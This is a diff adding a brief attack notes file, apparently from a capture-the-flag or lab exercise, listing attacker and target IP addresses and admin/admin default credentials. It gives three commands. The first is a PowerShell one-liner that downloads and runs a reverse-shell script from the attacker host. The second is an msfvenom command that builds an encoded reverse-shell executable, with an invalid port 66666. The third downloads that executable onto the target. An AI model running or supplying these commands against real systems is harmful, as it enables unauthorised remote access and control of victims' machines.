@@ -1,0 +1,12 @@
+attacker : 10.18.115.106
+target : 10.10.229.182
+
+8080
+admin
+admin
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.115.106/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.115.106 -Port 1414
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.18.115.106 LPORT=66666 -e x86/shikata_ga_nai -f exe -o PayRespect.exe
+
+powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://10.18.115.106/PayRespect.exe', 'C:\Users\bruce\Documents\PayRespect.exe')"
